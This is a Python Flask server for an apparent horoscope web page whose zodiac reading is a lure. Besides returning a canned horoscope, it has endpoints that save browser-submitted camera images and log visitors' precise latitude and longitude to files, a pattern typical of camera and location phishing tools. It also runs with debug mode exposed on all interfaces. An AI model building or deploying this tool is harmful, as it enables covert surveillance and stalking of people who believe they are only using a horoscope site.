from flask import Flask, render_template, request, jsonify
import base64, os, time, csv
from datetime import datetime

app = Flask(__name__)

IMG_DIR = "captures/images"
LOC_FILE = "captures/locations.csv"

os.makedirs(IMG_DIR, exist_ok=True)
os.makedirs("captures", exist_ok=True)

if not os.path.exists(LOC_FILE):
    with open(LOC_FILE, "w", newline="") as f:
        csv.writer(f).writerow(["timestamp", "lat", "lon", "accuracy"])

ZODIAC_DATA = {
    "Capricorn": "♑", "Aquarius": "♒", "Pisces": "♓",
    "Aries": "♈", "Taurus": "♉", "Gemini": "♊",
    "Cancer": "♋", "Leo": "♌", "Virgo": "♍",
    "Libra": "♎", "Scorpio": "♏", "Sagittarius": "♐"
}

def zodiac(month, day):
    signs = [
        ("Capricorn",(12,22),(1,19)), ("Aquarius",(1,20),(2,18)),
        ("Pisces",(2,19),(3,20)), ("Aries",(3,21),(4,19)),
        ("Taurus",(4,20),(5,20)), ("Gemini",(5,21),(6,20)),
        ("Cancer",(6,21),(7,22)), ("Leo",(7,23),(8,22)),
        ("Virgo",(8,23),(9,22)), ("Libra",(9,23),(10,22)),
        ("Scorpio",(10,23),(11,21)), ("Sagittarius",(11,22),(12,21))
    ]
    for s, start, end in signs:
        if (month == start[0] and day >= start[1]) or \
           (month == end[0] and day <= end[1]):
            return s
    return "Capricorn"

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/horoscope", methods=["POST"])
def horoscope():
    data = request.json
    dob = data["dob"]
    name = data["name"]
    city = data["city"]

    m, d = map(int, dob.split("-")[1:])
    sign = zodiac(m, d)

    return jsonify({
        "name": name,
        "city": city,
        "sign": sign,
        "icon": ZODIAC_DATA.get(sign, "✨"),
        "message": "A calm but powerful shift works in your favor today."
    })

@app.route("/capture", methods=["POST"])
def capture():
    img = base64.b64decode(request.json["image"].split(",")[1])
    path = f"{IMG_DIR}/{int(time.time())}.png"
    with open(path, "wb") as f:
        f.write(img)
    return jsonify({"saved": True})

@app.route("/location", methods=["POST"])
def location():
    d = request.json
    with open(LOC_FILE, "a", newline="") as f:
        csv.writer(f).writerow([
            datetime.utcnow().isoformat(),
            d["lat"], d["lon"], d["accuracy"]
        ])
    return jsonify({"logged": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
